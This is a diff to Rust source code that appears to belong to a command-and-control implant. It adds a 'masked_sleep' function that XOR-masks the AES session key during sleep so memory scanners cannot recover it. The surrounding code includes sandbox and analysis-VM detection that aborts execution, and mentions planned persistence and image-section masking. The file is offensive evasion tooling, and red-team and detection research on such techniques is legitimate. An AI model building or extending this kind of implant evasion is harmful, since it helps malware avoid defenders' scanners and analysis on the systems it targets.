@@ -8,6 +8,14 @@ const NO_EVASION: bool = {
     b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
 };
 
+const SLEEP_ENCRYPT: bool = match option_env!("DM_SLEEP_ENCRYPT") {
+    Some(v) => {
+        let b = v.as_bytes();
+        b.len() == 4 && b[0] == b't' && b[1] == b'r' && b[2] == b'u' && b[3] == b'e'
+    }
+    None => false,
+};
+
 /// abort_if_sandboxed runs before registration.
 /// Returns true if the environment looks like a sandbox or analysis VM.
 pub fn abort_if_sandboxed() -> bool {
@@ -38,6 +46,40 @@ pub fn should_abort() -> bool {
 pub fn cleanup() {
     // Phase 1: nothing to clean up (no persistence installed by default)
     // Phase 3: uninstall persistence module if it was installed
+}
+
+/// masked_sleep XOR-encrypts the session key for the duration of the sleep so
+/// memory scanners that dump the process during sleep cannot recover the AES key.
+///
+/// Phase 2 implementation: XOR-masks the 32-byte session key only.
+/// Phase 3 will add full image-section masking via a dedicated VirtualAlloc'd page
+/// (VirtualProtect on a stack or shared heap page is unsafe in a multi-threaded process).
+///
+/// Skipped when DM_NO_EVASION=true or DM_SLEEP_ENCRYPT is not "true".
+pub fn masked_sleep(duration: std::time::Duration, key: &mut [u8; 32]) {
+    if NO_EVASION || !SLEEP_ENCRYPT {
+        std::thread::sleep(duration);
+        return;
+    }
+
+    // Derive a one-time XOR byte from the current nanos; ensure it is never zero
+    // so the key is always visibly altered in memory.
+    let raw = (std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .subsec_nanos()
+        & 0xFF) as u8;
+    let mask = if raw == 0 { 1u8 } else { raw };
+
+    for b in key.iter_mut() {
+        *b ^= mask;
+    }
+
+    std::thread::sleep(duration);
+
+    for b in key.iter_mut() {
+        *b ^= mask;
+    }
 }
 
 // ---------------------------------------------------------------------------
